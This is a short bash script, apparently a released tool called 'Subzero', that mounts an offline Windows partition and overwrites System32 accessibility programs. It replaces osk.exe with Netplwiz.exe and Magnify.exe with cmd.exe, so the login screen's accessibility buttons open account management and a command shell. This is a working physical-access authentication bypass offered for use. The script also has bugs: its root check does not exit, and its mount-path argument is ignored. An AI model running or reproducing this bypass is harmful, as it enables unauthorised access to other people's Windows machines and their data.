#!/bin/bash

MYDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null && pwd )"
MKPATCH=1

usage()
{
    echo "$0 <path to where windows is mounted>"
    echo "if no mountpoint is provided, script will try to parse mountpoint as /dev/sda4"
}

if [[ $(whoami | grep root) ]]; then 
    : 
else 
    echo "Are we root? "
    exiting. 
fi 

if [[ $1 = "-h" ]]; then 
    usage 
    exit 
fi 

if [[ ! -n $1 ]]; then 
    MOUNTP=/dev/sda4
fi 
mkdir drive
sudo mount $MOUNTP drive   
if [[ $(ls drive/Windows/System32 | grep cmd.exe) ]]; then 
    :
else
    echo "System32 not found. Are you at the right directory?"
    exit 
fi 
echo "============================================================================="
echo " ______     __  __     ______     ______     ______     ______     ______    "  
echo "/\  ___\   /\ \/\ \   /\  == \   /\___  \   /\  ___\   /\  == \   /\  __ \   "  
echo "\ \___  \  \ \ \_\ \  \ \  __<   \/_/  /__  \ \  __\   \ \  __<   \ \ \/\ \  "
echo " \/\_____\  \ \_____\  \ \_____\   /\_____\  \ \_____\  \ \_\ \_\  \ \_____\ "
echo "  \/_____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_/ /_/   \/_____/ "
echo "============================================================================="
echo "            Release R2 . What does it need to be human? @Elation232          "
echo "============================================================================="
echo ""
echo ""
echo ""
echo ""
# Logic parts
cd drive/Windows/System32 
sudo cp -fpr osk.exe wtf.exe 
sudo cp -fpr Netplwiz.exe osk.exe
sudo cp -fpr Magnify.exe lmao.exe
sudo cp -fpr cmd.exe Magnify.exe
echo "Patching done !"
echo "Enable OSK and enjoy Control Panel !"
